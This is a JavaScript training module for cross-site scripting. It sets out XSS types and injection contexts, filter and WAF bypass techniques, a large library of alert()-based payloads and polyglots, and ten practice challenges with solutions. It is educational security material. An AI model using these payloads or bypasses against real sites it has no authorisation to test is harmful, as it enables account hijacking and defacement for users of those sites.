/**
 * c0m XSS Training Module
 * 
 * Hands-on XSS practice with progressive challenges.
 * Learn by doing, not just reading.
 * 
 * Based on PortSwigger Web Security Academy methodology.
 */

// ══════════════════════════════════════════════════════════════
// XSS FUNDAMENTALS
// ══════════════════════════════════════════════════════════════

const XSS_KNOWLEDGE = {
  types: {
    reflected: {
      name: 'Reflected XSS',
      description: 'Payload comes from the current HTTP request',
      example: 'https://site.com/search?q=<script>alert(1)</script>',
      impact: 'Session hijacking, phishing, defacement',
      difficulty: 'Easy to find, easy to exploit',
    },
    stored: {
      name: 'Stored XSS',
      description: 'Payload is stored on the server (DB, file, etc)',
      example: 'Comment field: <script>alert(1)</script>',
      impact: 'Affects all users who view the content',
      difficulty: 'Harder to find, higher impact',
    },
    dom: {
      name: 'DOM-based XSS',
      description: 'Payload is executed by client-side JavaScript',
      example: 'document.write(location.hash)',
      impact: 'Similar to reflected, but client-side only',
      difficulty: 'Requires understanding of JavaScript',
    },
  },
  
  contexts: [
    {
      name: 'HTML Context',
      description: 'Payload injected into HTML body',
      payload: '<script>alert(1)</script>',
      variations: [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
      ],
    },
    {
      name: 'Attribute Context',
      description: 'Payload injected into HTML attribute',
      payload: '" onmouseover="alert(1)',
      variations: [
        "' onclick='alert(1)",
        '" autofocus onfocus="alert(1)',
        "javascript:alert(1)",
      ],
    },
    {
      name: 'JavaScript Context',
      description: 'Payload injected into JavaScript code',
      payload: "';alert(1)//",
      variations: [
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
        "-alert(1)-",
      ],
    },
    {
      name: 'URL Context',
      description: 'Payload in href, src, etc.',
      payload: 'javascript:alert(1)',
      variations: [
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
      ],
    },
  ],
  
  bypassTechniques: [
    {
      name: 'Case Variation',
      blocked: '<script>',
      bypass: '<ScRiPt>',
    },
    {
      name: 'Null Bytes',
      blocked: '<script>',
      bypass: '<scr%00ipt>',
    },
    {
      name: 'HTML Encoding',
      blocked: 'alert',
      bypass: '&#97;&#108;&#101;&#114;&#116;',
    },
    {
      name: 'Unicode',
      blocked: '<',
      bypass: '\\u003c',
    },
    {
      name: 'Double Encoding',
      blocked: '<',
      bypass: '%253c',
    },
    {
      name: 'Without Parentheses',
      blocked: 'alert()',
      bypass: 'alert`1`',
    },
    {
      name: 'Without alert',
      blocked: 'alert',
      bypass: 'prompt(1) or confirm(1)',
    },
    {
      name: 'SVG/Math Elements',
      blocked: '<script>',
      bypass: '<svg/onload=alert(1)>',
    },
    {
      name: 'Event Handlers',
      blocked: 'script tags',
      bypass: '<img src=x onerror=alert(1)>',
    },
    {
      name: 'Template Literals',
      blocked: 'quotes',
      bypass: '${alert(1)}',
    },
  ],
};

// ══════════════════════════════════════════════════════════════
// PAYLOAD LIBRARY
// ══════════════════════════════════════════════════════════════

const XSS_PAYLOADS = {
  basic: [
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
  ],
  
  img: [
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="alert(1)">',
    '<img/src=x onerror=alert(1)>',
    '<img src=x:alert(alt) onerror=eval(src) alt=1>',
  ],
  
  svg: [
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload="alert(1)">',
    '<svg><script>alert(1)</script></svg>',
  ],
  
  body: [
    '<body onload=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body onfocus=alert(1) autofocus>',
  ],
  
  input: [
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<input type="image" src=x onerror=alert(1)>',
  ],
  
  anchor: [
    '<a href="javascript:alert(1)">click</a>',
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  ],
  
  iframe: [
    '<iframe src="javascript:alert(1)">',
    '<iframe onload=alert(1)>',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
  ],
  
  div: [
    '<div onmouseover="alert(1)">hover me</div>',
    '<div onclick="alert(1)">click me</div>',
  ],
  
  details: [
    '<details open ontoggle=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
  ],
  
  marquee: [
    '<marquee onstart=alert(1)>',
    '<marquee loop=1 onfinish=alert(1)>',
  ],
  
  select: [
    '<select onfocus=alert(1) autofocus>',
  ],
  
  video: [
    '<video src=x onerror=alert(1)>',
    '<video><source onerror=alert(1)>',
  ],
  
  audio: [
    '<audio src=x onerror=alert(1)>',
  ],
  
  math: [
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  ],
  
  object: [
    '<object data="javascript:alert(1)">',
  ],
  
  form: [
    '<form action="javascript:alert(1)"><input type=submit>',
  ],
  
  button: [
    '<button onfocus=alert(1) autofocus>',
    '<button onclick=alert(1)>click</button>',
  ],
  
  polyglots: [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"-->]]>*/</script></style></title></textarea></noscript></template></script><svg onload=alert()>",
    "'-alert(1)-'",
    '"><img src=x onerror=alert(1)>',
  ],
  
  wafBypass: [
    '<svg/onload=alert(1)>',
    '<svg%0Aonload=alert(1)>',
    '<svg%09onload=alert(1)>',
    '<svg%0Conload=alert(1)>',
    '<svg%0Donload=alert(1)>',
    '<svg%2Fonload=alert(1)>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<script>script>alert(1)<</script>/script>',
  ],
  
  eventHandlers: [
    'onafterprint', 'onafterscriptexecute', 'onanimationcancel', 'onanimationend',
    'onanimationiteration', 'onanimationstart', 'onauxclick', 'onbeforecopy',
    'onbeforecut', 'onbeforeinput', 'onbeforeprint', 'onbeforescriptexecute',
    'onbeforeunload', 'onblur', 'onclick', 'oncontextmenu', 'oncopy', 'oncut',
    'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragexit', 'ondragleave',
    'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onfocus', 'onfocusin',
    'onfocusout', 'onhashchange', 'oninput', 'onkeydown', 'onkeypress', 'onkeyup',
    'onload', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave',
    'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onpaste', 'onpointerdown',
    'onpointerenter', 'onpointerleave', 'onpointermove', 'onpointerout',
    'onpointerover', 'onpointerup', 'onreset', 'onresize', 'onscroll', 'onselect',
    'onsubmit', 'ontoggle', 'ontouchend', 'ontouchmove', 'ontouchstart',
    'ontransitioncancel', 'ontransitionend', 'ontransitionrun', 'ontransitionstart',
    'onunload', 'onwheel',
  ],
};

// ══════════════════════════════════════════════════════════════
// PRACTICE CHALLENGES
// ══════════════════════════════════════════════════════════════

const CHALLENGES = [
  {
    level: 1,
    name: 'Basic Reflected XSS',
    description: 'No filtering. Just inject and execute.',
    hint: 'Try: <script>alert(1)</script>',
    solution: '<script>alert(1)</script>',
  },
  {
    level: 2,
    name: 'XSS in Attribute',
    description: 'Your input goes into an attribute value.',
    hint: 'Break out of the attribute first',
    solution: '" onmouseover="alert(1)',
  },
  {
    level: 3,
    name: 'Script Tags Blocked',
    description: '<script> tags are filtered.',
    hint: 'Use event handlers instead',
    solution: '<img src=x onerror=alert(1)>',
  },
  {
    level: 4,
    name: 'Event Handlers Blocked',
    description: 'Common event handlers are blocked.',
    hint: 'Try less common events or SVG',
    solution: '<svg onload=alert(1)>',
  },
  {
    level: 5,
    name: 'Parentheses Blocked',
    description: '() characters are filtered.',
    hint: 'Template literals work without parentheses',
    solution: '<img src=x onerror=alert`1`>',
  },
  {
    level: 6,
    name: 'Alert Blocked',
    description: 'The word "alert" is blocked.',
    hint: 'Try confirm, prompt, or encoding',
    solution: '<img src=x onerror=confirm(1)>',
  },
  {
    level: 7,
    name: 'Spaces Blocked',
    description: 'Spaces are filtered.',
    hint: 'Use / or tabs instead',
    solution: '<svg/onload=alert(1)>',
  },
  {
    level: 8,
    name: 'DOM XSS',
    description: 'Payload reflected via JavaScript.',
    hint: 'Check for innerHTML, document.write, eval',
    solution: 'Depends on the sink function',
  },
  {
    level: 9,
    name: 'CSP Bypass',
    description: 'Content Security Policy in place.',
    hint: 'Look for JSONP endpoints or unsafe-inline',
    solution: 'Varies by CSP configuration',
  },
  {
    level: 10,
    name: 'Polyglot',
    description: 'Create payload that works in multiple contexts.',
    hint: 'Combine techniques',
    solution: "'-alert(1)-'",
  },
];

// ══════════════════════════════════════════════════════════════
// TRAINING INTERFACE
// ══════════════════════════════════════════════════════════════

function printLesson(topic) {
  if (topic === 'types') {
    console.log('\n═══ XSS TYPES ═══\n');
    for (const [key, type] of Object.entries(XSS_KNOWLEDGE.types)) {
      console.log(`📌 ${type.name}`);
      console.log(`   ${type.description}`);
      console.log(`   Example: ${type.example}`);
      console.log(`   Impact: ${type.impact}\n`);
    }
  } else if (topic === 'contexts') {
    console.log('\n═══ INJECTION CONTEXTS ═══\n');
    for (const ctx of XSS_KNOWLEDGE.contexts) {
      console.log(`📌 ${ctx.name}`);
      console.log(`   ${ctx.description}`);
      console.log(`   Basic: ${ctx.payload}`);
      console.log(`   Variations:`);
      ctx.variations.forEach(v => console.log(`     - ${v}`));
      console.log();
    }
  } else if (topic === 'bypass') {
    console.log('\n═══ BYPASS TECHNIQUES ═══\n');
    for (const bp of XSS_KNOWLEDGE.bypassTechniques) {
      console.log(`📌 ${bp.name}`);
      console.log(`   Blocked: ${bp.blocked}`);
      console.log(`   Bypass:  ${bp.bypass}\n`);
    }
  } else if (topic === 'payloads') {
    console.log('\n═══ PAYLOAD LIBRARY ═══\n');
    for (const [category, payloads] of Object.entries(XSS_PAYLOADS)) {
      if (Array.isArray(payloads)) {
        console.log(`📌 ${category.toUpperCase()}`);
        payloads.slice(0, 3).forEach(p => console.log(`   ${p}`));
        if (payloads.length > 3) console.log(`   ... and ${payloads.length - 3} more`);
        console.log();
      }
    }
  } else if (topic === 'challenges') {
    console.log('\n═══ PRACTICE CHALLENGES ═══\n');
    for (const ch of CHALLENGES) {
      console.log(`Level ${ch.level}: ${ch.name}`);
      console.log(`   ${ch.description}`);
      console.log(`   Hint: ${ch.hint}\n`);
    }
  } else {
    console.log(`
c0m XSS Training Module

Topics:
  types      - Reflected, Stored, DOM-based XSS
  contexts   - HTML, Attribute, JavaScript, URL contexts
  bypass     - WAF bypass techniques
  payloads   - Full payload library
  challenges - Practice challenges 1-10

Usage:
  node c0m-xss-trainer.js <topic>
  
Example:
  node c0m-xss-trainer.js types
  node c0m-xss-trainer.js payloads
  node c0m-xss-trainer.js challenges
  
Next Steps:
  1. Read all topics above
  2. Practice on PortSwigger: https://portswigger.net/web-security/cross-site-scripting
  3. Try HackTheBox XSS challenges
  4. Hunt on real bug bounty programs!
    `);
  }
}

// ══════════════════════════════════════════════════════════════
// EXPORT & CLI
// ══════════════════════════════════════════════════════════════

module.exports = {
  XSS_KNOWLEDGE,
  XSS_PAYLOADS,
  CHALLENGES,
  printLesson,
};

if (require.main === module) {
  const topic = process.argv[2];
  printLesson(topic);
}
